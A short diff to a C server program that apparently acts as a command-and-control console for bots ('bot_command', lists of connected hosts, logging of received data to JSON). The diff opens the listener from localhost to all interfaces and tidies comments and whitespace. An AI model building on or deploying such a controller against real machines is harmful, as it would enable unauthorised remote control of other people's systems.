@@ -41,7 +41,7 @@ static pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
 int main(void)
 {
     // Set the client connection to be the head of the list
-    connection client_con = bind_socket("127.0.0.1", SERVER_PORT);
+    connection client_con = bind_socket("0.0.0.0", SERVER_PORT);
     client_con.next = NULL;
 
     print_welcome_message();
@@ -303,7 +303,7 @@ void *bot_command(void *arg)
                             {
                                 // Oops, our recv call failed.
                                 printf("[-] Unable to recieve from %s. Removing from active connections...\n", tmp->hostname);
-                                
+
                                 // Delete connection from list
                                 delete_connection(head, tmp);
                                 tmp = tmp->next;
@@ -509,7 +509,6 @@ json_object *build_json_object(connection *client, char *dataRecieved, char *inp
     json_object *time = json_object_new_string(timeBuffer);
     json_object *date = json_object_new_string(dateBuffer);
     json_object *ipAddr = json_object_new_string(client->dest_ip);
-    //json_object *port = json_object_new_int(client->dest_port);
 
 
     json_object_object_add(propertiesObject, "hostname", hostName);
@@ -517,7 +516,6 @@ json_object *build_json_object(connection *client, char *dataRecieved, char *inp
     json_object_object_add(propertiesObject, "time", time);
     json_object_object_add(propertiesObject, "date", date);
     json_object_object_add(propertiesObject, "ip address", ipAddr);
-    //json_object_object_add(propertiesObject, "port number", port);
 
 
     json_object *returnedObject = json_object_new_object();
@@ -547,7 +545,7 @@ void output_to_json(json_object *jsonObject)
         //seek back until we find a comma, adding each char to the array
         int i = 0;
         char tmpchar = ' ';
-        
+
         while (1)
         {
             tmpchar = getc(jsonFile);
